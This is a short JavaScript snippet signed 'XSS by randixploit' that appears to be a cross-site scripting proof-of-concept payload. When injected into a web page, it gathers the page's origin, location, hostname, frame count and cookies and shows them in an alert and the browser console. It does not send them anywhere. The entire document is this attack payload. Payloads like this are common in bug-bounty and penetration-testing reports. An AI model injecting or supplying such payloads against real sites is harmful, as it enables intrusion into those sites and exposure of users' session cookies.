const details = `
  ⚡ XSS by randixploit ⚡
  ------------------------
  🌍 Origin: ${window.origin}
  📌 Location: ${window.location}
  🏠 Hostname: ${window.location.hostname}
  🗂️ Frames: ${window.frames.length}
  ------------------------
  🍪 Cookie(s): ${document.cookie || 'No cookies'}
`;
alert(details);
console.log(details);
